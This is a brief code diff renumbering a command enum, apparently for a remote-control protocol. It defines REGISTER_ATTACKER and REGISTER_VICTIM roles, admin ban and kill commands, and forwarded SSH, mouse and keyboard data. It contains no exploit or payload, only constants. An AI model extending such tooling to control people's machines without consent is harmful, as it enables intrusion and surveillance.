@@ -7,14 +7,17 @@ enum Cmd {
 	REGISTER_ATTACKER = 2,
 	REGISTER_VICTIM = 3,
 
-	CLIENTS_UPDATE = 4,
-	CHANGE_NAME = 5,	//admin
-	BAN_HID = 6,		//admin
-	UNBAN_HID = 7,		//admin
-	KILL = 8,			//admin
-	SAVE_DATASET = 9,	//admin
+	CLIENTS_UPDATE = 50,
+	CHANGE_NAME = 51,	//admin
+	BAN_HID = 52,		//admin
+	UNBAN_HID = 53,		//admin
+	KILL = 54,			//admin
+	SAVE_DATASET = 55,	//admin
 
 	START_SSH = 100,
 	END_SSH = 101,
-	SSH_DATA = 102
+	//every cmd from SSH_DATA to 150 should just be forwarded
+	SSH_DATA = 120,
+	SSH_MOUSE = 121,
+	SSH_KEYBOARD = 122,
 };
